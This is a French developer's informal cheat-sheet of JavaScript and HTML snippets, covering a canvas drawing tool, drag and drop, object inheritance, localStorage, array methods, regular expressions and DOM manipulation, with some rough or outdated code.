                      <strong class='tooltipPere'><img class="button modifier" onclick="keepDraw();" src="save.png"><div class='tooltipFilsAbs'>Sauver le dessin pour le fichier encours d'ecoute.</div></strong>
                      </div>
                <canvas width="300" height="203" id="imageView">
                        <p>Votre navigateur ne support pas cette fonctionnalite.</p>
                        <p>Voici les navigateurs adaptes:
                         <a href="http://www.opera.com">Opera</a>, 
                         <a href="http://www.mozilla.com">Firefox</a>, 
                         <a href="http://www.apple.com/safari">Safari</a>, et
                         <a href="http://www.konqueror.org">Konqueror</a>.</p>
                      </canvas>                             
                          function dessiner () 
                          {
                            // Find the canvas element.
                            canvas = document.getElementById('imageView');
                            // Get the 2D canvas context.
                            context = canvas.getContext('2d');        
                            // Pencil tool instance.
                            tool = new tool_pencil();
                            // Attach the mousedown, mousemove and mouseup event listeners.
                            canvas.addEventListener('mousedown', ev_canvas, false);
                            canvas.addEventListener('mousemove', ev_canvas, false);
                            canvas.addEventListener('mouseup',   ev_canvas, false);
                            // pour empecher que le curseur devienne un curseur pour saisir texte
                            canvas.onselectstart = function () { return false; } // ie
                            canvas.onmousedown = function () { return false; } // mozilla
                            // fin pour empecher
                            canvas.classList.add('ecrire');
                          }
                          function gommer () 
                          {
                            // Find the canvas element.
                            canvas = document.getElementById('imageView');
                            // Get the 2D canvas context.
                            context = canvas.getContext('2d');        
                            // Pencil tool instance.
                            tool = new tool_gommer();
                            // Attach the mousedown, mousemove and mouseup event listeners.
                            canvas.addEventListener('mousedown', ev_canvas, false);
                            canvas.addEventListener('mousemove', ev_canvas, false);
                            canvas.addEventListener('mouseup',   ev_canvas, false);
                            // pour empecher que le curseur devienne un curseur pour saisir texte
                            canvas.onselectstart = function () { return false; } // ie
                            canvas.onmousedown = function () { return false; } // mozilla
                            // fin pour empecher
                            canvas.classList.add('ecrire');
                          }
                          function keepDraw()
                          {
                          canvas = document.getElementById('imageView');
                          
                           var dataURL = canvas.toDataURL();
                           numFichierDraw[numfichierEnCours]=dataURL;
                           sendMessage("messageAudio","C'est sauv&eacute;.", "50%", "50%");
                           
                          }
                          
                          function ecrire() 
                          {
                            // Find the canvas element.
                            canvas = document.getElementById('imageView');
                            // Get the 2D canvas context.
                            context = canvas.getContext('2d');        
                            // Pencil tool instance.
                            tool = new tool_ecrire();
                            // Attach the mousedown, mousemove and mouseup event listeners.
                            canvas.removeEventListener('mousedown', ev_canvas, false);
                            canvas.removeEventListener('mousemove', ev_canvas, false);
                            canvas.addEventListener('mouseup',   ev_canvas, false);
                            canvas.classList.add('ecrire');
                          }
                          function tool_ecrire()
                          {
                                                          this.x=0;
                                                          this.y=0;
                                                          context.font      = "normal 12px Verdana";
                                                          context.fillStyle = "#000000";
                                                           // This is called when you start holding down the mouse button.
                                                          // This starts the pencil drawing.
                                                            // This function is called every time you move the mouse. Obviously, it only 
                                                            // draws if the tool.started state is set to true (when you are holding down 
                                                            // the mouse button).
                                                            this.keyup= function (ev) 
                                                            {
                                                                      if (tool.started) 
                                                                      {  
                                                                        if (ev.keyCode!=16)
                                                                        {
                                                                          exemples:
                                                                          ctx.fillStyle    = '#00f';
                                                                          ctx.font         = 'italic 30px sans-serif';
                                                                          ctx.textBaseline = 'top';
                                                                          ctx.fillText  ('Hello world!', 0, 0);
                                                                          ctx.font         = 'bold 30px sans-serif';
                                                                          ctx.strokeText('Hello world!', 0, 50);
                                                                          finexemples
                                                                          context.fillText(String.fromCharCode(ev.keyCode), x-70, y-297);
                                                                          x=x+8;
                                                                        }
                                                                      }
                                                            };
                                                            // This is called when you release the mouse button.
                                                            this.mouseup = function (ev) 
                                                            {
                                                                      window.addEventListener("keyup", ev_canvas, false); // ne marche pas sur IE internet explorer donc dans ce cas faire le pour multibrowser ci dessous:
                                                                          x=ev._x;
                                                                          y=ev._y;
                                                                        tool.started = true;
                                                                        pour multibrowser:
                                                                        if (window.addEventListener) // tout browser
                                                                        {
                                                                                        window.addEventListener("keyup", toucheEntree, false); 
                                                                        } 
                                                                          else if (document.attachEvent)            // pour IE Internet explorer
                                                                          {
                                                                                    document.attachEvent('onkeypress', toucheEntree); // attachevent n'est plus supporte
                                                                          }
                                                                          function toucheEntree (ev)
                                                                          {
                                                                            try {
                                                                                  var key = window.event.keyCode;
                                                                                } catch(ex)
                                                                                {
                                                                                  var key = e.which;
                                                                                }
                                                                                    if (key==13)
                                                                                   {
                                                                                    recharge(document.what);
                                                                                   }
                                                                                  }
                                                              };    
                          }
                          function tool_pencil () 
                                            {
                                                          var tool = this;
                                                          this.started = false;
                                                          context.fillStyle = "#000000";
                                                           // This is called when you start holding down the mouse button.
                                                          // This starts the pencil drawing.
                                                            this.mousedown = function (ev) 
                                                            {
                                                                                                             context.beginPath();
                                                                    context.moveTo(ev._x, ev._y);
                                                                    //context.moveTo(ev._x-70, ev._y);
                                                                    tool.started = true;
                                                            };
                                                            // This function is called every time you move the mouse. Obviously, it only 
                                                            // draws if the tool.started state is set to true (when you are holding down 
                                                            // the mouse button).
                                                            this.mousemove = function (ev) 
                                                            {
                                                                      if (tool.started) 
                                                                      {  
                                                                        context.lineTo(ev._x, ev._y);
                                                                        //context.lineTo(ev._x-70, ev._y);
                                                                        context.stroke();
                                                                      }
                                                            };
                                                            // This is called when you release the mouse button.
                                                            this.mouseup = function (ev) 
                                                            {
                                                                      if (tool.started) 
                                                                      {
                                                                        tool.mousemove(ev);
                                                                        tool.started = false;
                                                                      }
                                                            };
                                            }
                          function tool_gommer () 
                                            {
                                                          var tool = this;
                                                          this.started = false;
                                                          context.fillStyle = "#FFFFCD";
                                                           // This is called when you start holding down the mouse button.
                                                          // This starts the pencil drawing.
                                                            this.mousedown = function (ev) 
                                                            {
                                                                    context.beginPath();
                                                                    context.moveTo(ev._x-70, ev._y-297);
                                                                    //context.moveTo(ev._x-70, ev._y);
                                                                    tool.started = true;
                                                            };
                                                            // This function is called every time you move the mouse. Obviously, it only 
                                                            // draws if the tool.started state is set to true (when you are holding down 
                                                            // the mouse button).
                                                            this.mousemove = function (ev) 
                                                            {
                                                                      if (tool.started) 
                                                                      {  
                                                                        context.clearRect ( ev._x-70, ev._y-297 , 10 , 10 );
                                                                        //context.clearRect ( ev._x-70, ev._y , 10 , 10 );
                                                                      }
                                                            };
                                                            // This is called when you release the mouse button.
                                                            this.mouseup = function (ev) 
                                                            {
                                                                      if (tool.started) 
                                                                      {
                                                                        tool.mousemove(ev);
                                                                        tool.started = false;
                                                                      }
                                                            };
                                            }                  
                          function ev_canvas (ev) 
                                            {                  
                                                 //   if (ev.layerX || ev.layerX == 0) 
                                                 //   { // Firefox
                                                 tenir compte des scrolls scrool
                                                      //ev._x = (ev.layerX-ev.currentTarget.offsetLeft)/ev.layerX-ev.currentTarget.offsetWidth;
                                                      //ev._y = ev.layerY-ev.currentTarget.offsetTop;
                                                      ev._x = getOffset(ev).x;//-ev.currentTarget.offsetLeft; // voir utils
                                                      ev._y = getOffset(ev).y;//-ev.currentTarget.offsetTop;
ou
                                                      ev._x = ev.pageX -ev.currentTarget.offsetLeft-10;
                                                      ev._y = ev.layerY-ev.currentTarget.offsetTop;//-(ev.offsetY/2,5);
                                                      
                                                   // }
                                                  //  else if (ev.offsetX || ev.offsetX == 0) 
                                                   // { // Opera
                                                    //  ev._x = ev.offsetX;
                                                   //   ev._y = ev.offsetY;
                                                  //  }      
                                                    // Call the event handler of the tool.
                                                    var func = tool[ev.type];  // ouaou!! c'est puissant! func c'est la fonction dont le nom est "ev.type" de l'objet tool qui est tool_pencil en fait c'est de l'introspection!
                                                    if (func) 
                                                    {
                                                    console.log(ev._x);
                                                      func(ev);
                                                    }
                                            }         
dessiner un cercle dans un canvas:
      context.beginPath();
      context.arc(posx, posy, taille0-100?, 0(angleDeDepart), 2 * Math.PI    (cad angleDeFinEnviron6.3PourFaireUnCercle), false(sensBof));
      context.fillStyle = 'green';
      context.fill();
      context.lineWidth = 5;
      context.strokeStyle = '#003300';
      context.stroke();         
pour faire des graphs interactifs avec canvas prendre exemple sur memoclap diagram.php
pour faire un drag and drop avec html5:
                  <img src='move.png' class='buttonmove' onmousedown='startDrag(this.parentNode)' name='dragBoucle'  title='Sert &agrave; changer la position de cette boucle'/>
                  startDrag=function(element)
                  {
                    element.addEventListener('dragstart', handleDragStart, false);
                    var lignes = document.getElementsByName("dropableEltBoucle");
                    for(var i=0; i<lignes.length; i++)
                    {
                      if (element.id!=lignes[i].id)
                      {
                      lignes[i].addEventListener('dragenter', handleDragEnter, false);
                      lignes[i].addEventListener('dragover', handleDragOver, false);
                      lignes[i].addEventListener('dragleave', handleDragLeave, false);
                      lignes[i].addEventListener('drop', handleDrop, false); ou plutot dragend
                      lignes[i].addEventListener('dragend', handleDragEnd, false);
                      }
                    }
                  }
                  handleDragStart=function(e)
                  {
                    e.dataTransfer.setData("text", this.id); // attention ne mettre que soit text/html soit text soit url soit d' autres trucs à voir
                  }
                  handleDragEnter=function(e)
                  {
                        this.classList.add('over');
                      return false;
                  }
                  handleDragOver=function(e)
                  {
                    this.classList.add('over');
                    if (e.preventDefault) {
                      e.preventDefault(); // Necessary. Allows us to drop.
                    }
                     e.dataTransfer.dropEffect = 'move';  // See the section on the DataTransfer object.
                     return false;
                  }
                  handleDragLeave=function(e)
                  {
                   this.classList.remove('over');  // this / e.target is previous target element.
                  }
                  
                  handleDrop=function(e) {
                        this.classList.remove('over'); 
                       if (e.stopPropagation) {
                          e.stopPropagation(); // stops the browser from redirecting.
                      }
                       if (e.preventDefault) {
                          e.preventDefault();
                        }
                      tomoveId  = e.dataTransfer.getData("text")
                      tomove = document.getElementById(tomoveId);
                      //document.getElementById(tomoveId).parentNode.removeChild(document.getElementById(tomoveId));
                      removeFromTableByElementValue(saveLoops,tomoveId);
                      var ret = existvalue(saveLoops,this.id);
                      saveLoops.splice(ret,0,tomoveId); 
                      updateSaveLoops();
                      
                      return false;
                    }
                  handleDragEnd=function(e) {
                    var lignes = document.getElementsByName("dropableEltBoucle");
                    for(var i=0; i<lignes.length; i++)
                    {
                      lignes[i].classList.remove('over');
                    }
                    
                  }
pour setter le name l'attribut la propriete d'un element tag html :  
        the element normally does not have a name attribute, so setting the DOM property like that myelement.name="toto" won't work.
        For example, setting the name property on an input element will work. Setting it on a div will not.
        It will work, however, with myelement.setAttribute("name","toto").
generer une image à la volee:
        var img=new Image();
       img.src="clearmute.png";
pour faire un onchange en javascript: 
        <input name="files" class="modifier" id="files" onchange="createProject.handleFileSelect(this)" onclick="this.value=null;" type="file" accept="*/*" /> //onclick="this.value=null" c'est pour permettre de rechoisir le meme fichier à uploader
        ou
        elSel.onchange=function(){setSilencesInverseToActorDelimited(actor, this.value, document.getElementById("startFlag").value, document.getElementById("stopFlag").value );};
les objets en javascript sont des fonctions qui peuvent contenir des proprietes et des fonctions et ces objets peuvent etre tranformes en string json:
            pour faire un objet independant avec ses methodes et ses variables: 
                    // je definis mon objet
                    monObjet = function(options) 
                    {
                      var unevariable, uneautrevariable;
                    		function unemethode(id, style) 
                        {
                    		  (...)
                    	 }
                    
                    }
                  // je declare mon objet
                  var gui = new monObjet();
                  // je modifie mon objet à la volee
                    gui.nouvellemethode = function(options) // voir constructeur 
                  {
            		  }
parcourir les proprietes d un objet:
       for(key in obj) {
        ... obj[key] ...
            ou
            obj.key
      }            
 recuperer la propriete d un objet
  var keys = Object.keys(myJsonObject);
  alert(keys[key]);
heritage : THE BEST ! heritage avec de purs objets (duck typing) (import et export ne marche qu'avec un petit serveur (npm))
  export Toto ={                   
          this.sound="zzzz"
          tals(){alert(this.sound)},
          zozo(){xxx}
          let huhu = this.tintin(); // tintin peut etre defini ou overridé dans une sous classe
          };
          ggg= Toto
          ggg.tals()
       export Titi ={
          tals(){blabla} // override la methode tals du parent
       };
       Object.assign(Titi, Toto); // du coup titi va etendre toto
          ---
       export function UneMethodeA(){...} (si ma class ou mon objet n'a qu'une seule méthode alors autant la transformer en fonction)
       export function UneMethodeB(){...}
       Dans une autre classe: 
        this.haha= x?UneMethodeA:UneMethodeB
        this.haha() // c'est du polymorphisme léger dans ce js dynamique
       
       
nouvelle facon de definir les classes et l'heritage : mais en javascript on peut aussi faire des factory functions =composition voir Linkfactoryfnct
       export class Toto {         
             // je ne peux pas definir de variables ici... faire comme ci dessous          
                constructor() // Facultatif
                {
                  this.sound="zzzz"
                }
                tals(){
                  alert(this.sound)
                }
                let huhu = this.tintin(); // tintin peut etre defini ou overridé dans une sous classe
          }
          ggg=new Toto()
          ggg.tals()        mais si je fais let xx=toto.tals; alors xx() va faire undefined car this est undefined. Il faut faire xx.bind(toto); xx.(); et là ca marche. Attribue un objet à this.
       export class Titi extends Toto{
          tals(){blabla} // override la methode tals du parent
       }
          
        l'heritage avec prototype : LINKpptypeksdf
                              function capture(ev){
                                        /*...*/
                                        //this c'est cette fonction.
                                          Truc.call(this); // recopie les attributs de Truc dans Animal (donc unAttribut="oui" vient ici)// pas encore clair!
                  
                                      }
                                      capture.prototype.unevarialbe=qqchose; // on peut faire .prototype que si capture est une fonction (n'est utile que si ensuite on fait xx=new capture()) sinon on peut directement faire capture.unevariable=qqchose; ou capture.__proto__.unevariable=qqchose;
                              let parent ={                   
                                          xpos:"a",
                                          ypos:"b",
                                          toto:function(){/*...*/}, // pas oublier la virgule . Sappelle comme ça depuis l'exterieur:	parent.toto(); methode statique.static
                                          titi:capture,
                                          baba // est la contraction de baba:baba si par ex baba est une fonction ou une variable qqpart
                                          //this c'est parent.
                                        }
                                        // c'est trois commandes font la meme chose: fils à pour prototype parent: c a d fils recupere les meth et variable dans son prototype parent PAR POINTEUR(PAS PAR COPIE) si il ne les a pas lui meme à l'appel. 
                                               . let fils =Object.create(parent);
                                               . let fils=new parent(); // ne marche que si parent est une fonction 
                                               . Object.setPrototypeOf(fils,parent);
                                                alors: parent.isPrototypeOf(fils) // return true
                                                et fils.__proto__ renvoit l'objet fils contenant tout les pointeurs (meth, variables) de son(ses)parents(prototypes)
                                          Je peux rajouter des meth/var a fils dynamiquement:
                                          fils.prototype.changeName = function(name) {
                                                                        this.name = name;}
                                        faire super si fils et parent on meme nom de methode:
                                                unemethodeOverrideedansfils:function(x,y){ //override la methode du parent
                                                  (...)
                                                    this.__proto__.unemethodeOverrideedansfils();// comme super: ca c'est dans fils et il appelle la methode de son prototype qui a le meme nom                                        
        avant:                                  
              function codeSuper()
                  {
                      this.class_codeSuper=[]; //ses methodes et proprietes sont accessibles par les enfants
                      this.init=function(unparam)  // une methode
                      {
                        this.idparent=unparam;
                      }
                      this.class_codeSuper.init=this.init; //que je rends accessible a ses enfants (super peut etre appelle)
                      this.test=function() // pareil que ci dessus...
                      {
                          alert("B");
                      }
                       this.class_codeSuper.test=this.test;
                  }
                  //enfant
                  function codeHider(uidP)
                  {
                      codeSuper.call(this); //j herite de la classe parente ses proprietes et ses methodes
                      this.class_codeSuper.init.call(this,uidP);  //j appelle la methode super du parent
                      this.test=function()                     // j override la methode parente
                      {
                        alert(this.idparent); //ovverride
                        this.class_codeSuper.test.call(this);   // mais je peux l'appeller aussi cette meme methode parente aue jai override
                      }
                  }
                  a=new codeHider(3);
                  a.test();
          // MethodeMemOclap:
            Classe parent
                  function Truc()
                  {
                     this.class_Truc =[]; //Initialise la variable qui permet d'identifier la classe ailleurs. et permettra la recup des methodes super  (bien mettre [] pour ca)
                     this.unAttribut="oui";
                                                          // Prepare la fonction 'super'
                     this.class_Truc.toString = Truc.toString_S; //comme ca dans la methode static fille this.class_Truc.toString.call(this) pourra appeler cette fonction super * 
                     this.toString = Truc.toString_S;     //la methode static est dupliquee en methode d'occurence *
                     this.methodedInstance= function(){blah}
                  }
                  Truc.toString_S = function(){return "Tiens un truc ! ";} // definition de la methode static de Truc puis voir plus haut*.
                  
                  function Animal()
                  {
                    Truc.call(this); // Cf Heritage par le constructeur de la classe mere: recopie les attributs de Truc dans Animal (donc unAttribut="oui" vient ici)
                    this.class_Animal =[]; // Initialise la variable qui permet d'identifier la classe ailleurs. et permettra la recup des methodes super. Car dans la fille Animal.call(this) recup les methodes supers.
                    this.unAttribut="oui"; // override l'attribut du parent
                    this.class_Animal.toString = Animal.toString_S; // pareil: permet à un fils d'appeler super. 
                    this.toString = Animal.toString_S;    // fonction d'occurence
                  }
                  Animal.toString_S = function(){return this.class_Truc.toString.call(this)+"c'est un animal";} // definition de la methode statique ET celle ci appelle la methode super du parent!
                  
                  et ainsi de suite je peux faire function Chien qui herite de la meme facon de Animal et on aura: Truc>Animal>Chien et Chien.toString returnera: "tiens un truc! c'est un animal c'est un chien"
              Autre methode plus archaique: Test avec Philou
              Alerter = function()
              {
                          this.name="Alerter !";
                          this.myArray=[1,2,3,4,5,6];
                          this.myObject={test1: 1, test2: 2, test3: 3, test4: function() { console.log("toto");} };
                          this.launchAlert=function(text){ console.log(text + " " +this.name ); } // methode d'occurence
                          this.launchAlert2=function(text){ console.log("text" + " 2"); }
              }
              var alerter = new Alerter();
              var alerter2 = new Alerter();
              var json = Object.toJSON(alerter);
              var myobjectUnserialized = json.evalJSON(json);
              alerter.launchAlert("c'est une alerte de type 1");
              alerter.launchAlert2("c'est une alerte de type 1");
              var alerter3 = Object.extend(myobjectUnserialized,new Alerter()); // heritage .. bof. Utiliser plutot methode du dessus
              // je ne suis pas sur qu'il herite des parametres alors faire:  
              // Recopie des attributs au moyen d'une simple boucle
                    		for (var element in Alerter.prototype ) 
                        {
                    			DrawingFile.prototype[element] = Alerter.prototype[element]
                    		}
                    	
              alerter3.launchAlert("test");
              ajout d'une function a alerter3: 
              alerter3.prototype.nouvellefonction= function() 
              {
                blah;
              }
contraction : 
    hehe = chose.truc || new Machin(); // hehe = chose.truc si l'est pas null sinon c'est new Machin()              
    hoho = !!tata.titi; // si titi = null alors hoho = false sinon il sera ==tata.titi. (je crois)
    
pour tester qu'un caractère est un chiffre nombre:
  isNaN("sdlfk"); // renvoit boolean;
// ICI j'ai supprime du code en double.. ne pas remetre avec Beyond compare
supprimer un fils:
        document.getElementById("saved").removeChild(document.getElementById(idgenerated));
supprimer tous les fils:
    while (node.hasChildNodes()) 
    {
          node.removeChild(node.lastChild);
    }
      
    localStorage :
            memoire illimitee dans le temps 
          <script type="text/javascript">
            localStorage.lastname="Smith";
            document.write(localStorage.lastname);
            if (localStorage.pagecount)
              {
              localStorage.pagecount=Number(localStorage.pagecount) +1;
              }
            </script>
            ajouter:
            localStorage.setItem("fichiersNames",JSON.stringify(myProjectTemp.fichiersNames));
            pour recuperer:
            localStorage.getItem("myProjects")!=undefined
            pour supprimer tout le localstorage de mon domain: 
              localStorage.clear();
    sessionStorage :
        memoire rattachee a la session de l'utilisateur: ephemere:
              <script type="text/javascript">
                sessionStorage.lastname="Smith";
                document.write(sessionStorage.lastname);
                </script> 
lastindexof : (contains contient)
  string.lastIndexOf(searchstring)
endsWith en javascript: (se termine par) 
    monString.match("bla$")
startsWith :
    monString.indexOf("bla")==0
pour avoir les fils d'un element:  queryselector
      utiliser soit .children soit .childNodes (na pas marche une fois) > fils direct(premier fils); " " fils indirect; a (balise de type a); a[toto] balise de type a avec un attribut toto; a[toto=titi] balise de type a avec un attribut toto = titi; a,b a ou b; a.toto a avec une classe=toto; #hehe  id=hehe
      document.querySelector("#prompt>#prompt1>div").children;// c'est un tableau donc on peut faire document.querySelector("#prompt>#prompt1>div").children[0];
pour avoir tous les elements fils de manière recursive: 
          myDiv.getElementsByTagName("*")
pour les avoir tous d'un coup: 
      var cols = document.querySelectorAll('#columns .column');
      var list = document.querySelectorAll("input[type='checkbox']"); (tous les checkbox d'un coup)
          querySelectorAll.forEach...// attention au E majuscule
          ou
          [].forEach.call(cols, function(col) {
            col.addEventListener('dragstart', handleDragStart, false);
          });
pour deplacer un objet du dom
    document.querySelector("#prompt>#prompt1>div").appendChild(document.getElementById('blah'));
pour placer ajouter inserer dans un element un objet quelquepart (puissant!)
elementDansQUoiJeVeuxAjouter.insertAdjacentElement('afterbegin', elementaajouter); //beforebegin ou afterbegin ou beforeend ou afterend // si j'ai erreur insertAdjacentElement' on 'Element': parameter 2 is not of type 'Element' "document-fragment" parce que j'utilise un template: essayer methode LINKhgjhjhjhjh    
pour placer dans le dom un objet avant: LINKhgjhjhjhjh 
  unElementParent.insertBefore(nouvelobjet,unFilsAvantQuiJeVeuxMettre);
localstorage: memoire permanente sur un browser:
      if (typeof(localStorage) == 'undefined' ) 
      {
      	alert('Your browser does not support HTML5 localStorage. Try upgrading.');
      }
      else
      {
      	try 
        {
      		localStorage.setItem("name", "Hello World!"); //saves to the database, "key", "value"
      	}
        catch (e) 
        {
      	 	 if (e == QUOTA_EXCEEDED_ERR) 
            {
      	 	 	 alert('Quota exceeded!'); //data wasn't successfully saved due to quota exceed so throw an error
      		}
      	}
      	document.write(localStorage.getItem("name")); //Hello World!
      	localStorage.removeItem("name"); //deletes the matching item from the database
      }
SessionStorage: memoire temporaire associee à la session de l'utilisateur.
      disparait si perte de session
pour setter les margin-left et margin-top: 
      document.getElementById(cible).style.marginTop=top;
      document.getElementById(cible).style.marginLeft=left;
pour setter le transform: 
document.getElementById("testimonials").style.webkitTransform = "rotate(-20deg)"; ou "translate(3em,0)"
pour setter le float:
      closebtn.style.cssFloat="right";
      closebtn.styleFloat = "right"; // pour les deux navigateurs 
pour detecter qu'on a presse sur la touche entre retour chariot appuye sur une touhce sur n'importe quel element: 
      document.getElementById('acteurtxt').addEventListener('keydown',  function(e) { handleKeys(e); }, false);
      handleKeys = function(e)
      {
        if(e.keyCode==13) // 13 ou 16=touche entree     8 c'est backspace: effacer
        {
        ajouteActeur();
        } 
      }

pour empecher que le bouton effacer ne fasse un retour arriere:
                                           // Prevent the backspace key from navigating back.
                                              document.unbind('keydown').bind('keydown', function (event) 
                                            	{
                                                  var doPrevent = false;
                                                  if (event.keyCode === 8) 
                                                  {
                                                      var d = event.srcElement || event.target;
                                                     if ((d.tagName.toUpperCase() === 'INPUT' && (d.type.toUpperCase() === 'TEXT' || d.type.toUpperCase() === 'PASSWORD')) 
                                                           || d.tagName.toUpperCase() === 'TEXTAREA') {
                                                          doPrevent = d.readOnly || d.disabled;
                                                      }
                                                      else {
                                                          doPrevent = true;
                                                      }
                                                  }

                                                  if (doPrevent) {
                                                      event.preventDefault();
                                                  }
                                              });

tableaux: fonctionnement et suppression d'un element du tableau: 
                                          Lorsque l'on code ceci:
                                    
                                     var tab = new Array();
                                     tab["popo"] = 1;
                                     tab["tutu"] = 56;
                                     tab["tata"] = 57;
                                     tab["titi"] = 58;
                                    
                                    En realite, on ajoute aucun element dans la liste car
                                    
                                     alert(tab.length); //affiche 0
                                    
                                    En realite, on ajoute des paramètres à l'objet json tab. On peut d'ailleurs recuperer ces valeurs de la manière suivante:
                                    
                                     alert(tab.tutu); //affiche 56
                                    
                                    Et ces paramètres sont effaçable par la commande "delete"
                                    
                                     delete(tab["tutu"]); Attention: delete peut aussi supprimer par index et du coup ca ne decalle pas le reste du tableau
                                      un JSON.stringify(tab) affichera []. Pour afficher faire comme ci-dessous
                                     for(var i in tab){
                                        document.write('tab["'+i+'"] = '+tab[i]+';<br>');
                                     }
                                     //affiche
                                     //tab["popo"] = 1;
                                     //tab["tata"] = 57;
                                     //tab["titi"] = 58;
                                     SPLICE (attention ne pas confondre avec slice)peut supprimer ou inserer des elements dans un tableau et decaller correctement le reste.
                                     SUPPRIMER: 
                                    En revenche, si on utilise les listes "normalement" (sans utiliser d'indices textuels), on peut utiliser la fonction suivante:
                                        suppression d'un element du tableau: ca decale le reste en arriere
                                              arrayName.splice(i,1); ne surtout pas faire monarray= monarray.splice(...)il renvoit ce qu'on a supprime!! // supprime à la position i un seul element.
                                        insertion d'un element dans un tableau: declale le reste en avant: 
                                                arrayName.splice(2,0,8); // ajoute à la position 2 le chiffre 8 et decalle le reste en avant
                                                toto.splice(2,0,8,9,10); // ajoute à la position 2 les chiffres 8, 9 et 10 et decalle le reste.
                                        remplacer les elements dans un tableau: 
                                                toto.splice(2,3,8,9,10); remplace à partir de la position 2 , 3 elements par 8, 9 et 10
                                      sinon en plus verbeux: (mais bon ci dessus ca marche tres bien)
                                    remove=function(){
                                     if(arguments[1]>0){
                                       var _temp=arguments[0].splice(0,arguments[1]);
                                       arguments[0].shift();// voir plus bas
                                       while(_temp.length>0){
                                          arguments[0].unshift(_temp.pop());// voir plus bas
                                       }
                                     }
                                     else{
                                       arguments[0].shift(); // voir plus bas
                                     }
                                   };
          convertir un formulaire html en objet json ayant les mêmes proprietes que le formulaire: LINKç'ç'ç"_()
                                            for (const[key,value] of monobjetFormData.entries())
                                            {
                                              mavariablejsonQuiEstUnTableau[key]=encodeURIComponent(value); // Ca ne m'ajoute rien dans mon tableau mais ça ajoute une propriete à mon objet json
                                                                              //encodeURIComponent est bien du javascript utilise ici pour que meme les caractères characteres speciaux passent bien en http car il remplace avec les codes pourcentage (voir ajax LINKç'ç'ç"_()) Inutile si je mets le json dans le payload de la requete
                                            }
                                            return mavariablejsonQuiEstUnTableau;
recuperer le lastindex of d'un table de type propriete: 
  monArray.length-1;
tableaux suite:
  pour verifier que tous les elements d'un tableau sont vides: 
    monArray.every(uneMethodeDeTest[, thisObject]);
      uneMethodeDeTest peut etre: 
       function isNull(element, index, array) 
       {  
                return (element == null);  
       } 
  pop supprime dernier element tableau. push ajoute dernier element tableau; shift supprime premier element tableau et decale le reste (retourne la valeur supprimee). unshift: ajoute???premier element tableau et decalle le reste
  attention push renvoit non pas l'array mais ce qu'on a ajoute
  pour remplacer les elements d'un tableau: array.splice(0,5,"lkf","lkjfs","sdlfkj,"olkj","lkjsdf"); // de l'element 0 pendant un nombre 5. Liste des elements qui remplacent.(facultatif)
      ne surtout pas faire monarray= monarray.splice(...)il renvoit ce qu'on a supprime!!
  slice pour faire des subarray: exemple: attention ne pas confondre avec splice
        res = tableau.unarray.slice(0,9); // recupere les 9 premiers elements du tableau 
        SUPER important si on veut copier une array dans une autre array. Car si on fait ca nouvellAray=monArray ca fait un pointeur!!!
          var newArray= myArray.slice(); 
        pointeur :
        si je recupere un objet d une table comme ca par exemple
          objectChoosen=table[i].childs[j];
          objectChoosen est un pointeur et si je modif ses parametres ca modif direct dans mon tableau Super!
pour que quand on commence a tapper saisir taper on execute du javascript: oninput:
          pour aussi mettre un texte par defaut: placeholder
              <input type="text" maxlength="10" id="acteurtxt" oninput="monjavascript" required placeholder="Saisissez un nom d&#39;un mec"/>(appostrophe geree avec &#39;)
faire disparaitre un div layer au premier plan pour agir derriere:
          #masqueItalienne {
            transition: opacity 2s ease;
            -moz-transition: opacity 2s ease;
            -webkit-transition: opacity 2s ease;
            -o-transition: opacity 2s ease;
            (...)
      <div id="masqueItalienne">
          <a onclick="document.getElementById('masqueItalienne').style.opacity='0.0'; setTimeout('document.getElementById(\'masqueItalienne\').style.display=\'none\'',2000);"><h2>Cliquez ici si vous voulez travailler une italienne</h2></a>
          </div>
pour ajouter ou supprimer une classe dans une liste de classe: 
    this.classList.add('over');
    this.classList.remove('over'); 
    document.getElementById("theID").removeAttribute("class"); //pour les effacer toutes les classes tous remove all      
changer une classe en javascript:
  document.getElementById("btnTest").className= "buttonType2"
pour recuperer l'element suivant: 
    this.nextSibling.value
    et l'element precedent: 
    this.previousSibling.value
    ou nextElementSibling si on veut bypasser les elements textes et <br>...
    navigation a volonte!!
    this.parentNode.nextSibling.firstChild.innerHTML
data api audio echantillon valeur spectre temporel


pour changer la classe d'un objet à la vollee: (au lieu de faire .style...)
    if (hrefobj.className=="button green")
  	{
  		hrefobj.className="button greenover";
  		//songs.muste(document.getElementById('duration').value);
  	}
  	else
  	{
  		hrefobj.className="button green";
  	}
pour tester ses expressions regulières:regexp : attention j'ai l'impression qu'on ne peux pas utiliser les tests sur les memes expressions regulieres plusieurs fois...
    les caracteres d'echappement des regexp est \\
        https://regex101.com/ 
      http://quentinc.net/javascript/testeur-expressions-regulieres/
      pour comprendre: 
      http://www.commentcamarche.net/contents/javascript/jsregexp.php3
      exemple pour matcher des mots entiers: 
          (\bplat\b|\bmontant\b)|(\bplat\b&\bmontant\b) veut dire (plat ET montant) OU (plat ET montant)
      exemple: /siare7/xxsia
       match avec 
       ^(/[a-zA-Z0-9]+)+$
        ou
        (/[a-zA-Z0-9]+)+ cest pareil.
      exemple: 
        p036782, p036782  ou  p036782, AWACT01 ou AWACT01, p036782  
      match avec:
        ^([A-Za-z][A-Za-z0-9][0-9][0-9][0-9][0-9][0-9], |AWACT01, )*[A-Za-z][A-Za-z0-9][0-9][0-9][0-9][0-9][0-9]|AWACT01$
      exemple email: 
            kanail@hotmail.com
      match avec: 
          ^.+@.+[.].+$
      exemple: [0-9]{4,6}     //{n,m} veut dire Match at least n but not more than m times.
             match avec 1234 ou 12345
       contient que des characteres ascii: 
          ^[\u0020-\u007e]+$
       contient des caractères speciaux: 
                if(!password.match(".*[^A-Za-z0-9].*")){                    
        Pour faire le test en javascript:
                            var reg=new RegExp(regexp,"g"); // "g" permet de remplacer tout
                    			if (reg.test(chaine1)) 
                    			{
                    				document.write("est bien au format date<BR>")
                    			}
                    			else 
                    			{
                    				document.write("n'est pas au format date<BR>")
                    			}
pour faire une regexp case insensitive maj min ignorer
  patternToReplace = new RegExp(tosearch, 'i');
regexp plus grand que plus petit que greater than lesser than
      ^([5-9]\d|[1-9]\d{2,})$                    			
trouver une chaine de caractere dans une autre chaine: 
      c'est le meme moteur que regexp: pour echaper les caractères speciaux escape: 
       boutDeChaineEscp=code.replace(/[\-\[\]\/\{\}\(\)\*\+\?\.\\\^\$\|]/g, "\\$&"); // ou codeescp est mon expression regulière
      toutelachaine.search(boutDeChaineEscp); renvoit -1 si rien trouve

arrondir un chiffre avec des zeros : en faire des multiples de mille ici // regarder aussi DecimalFormat 
      function followByZerosForLenght(number)
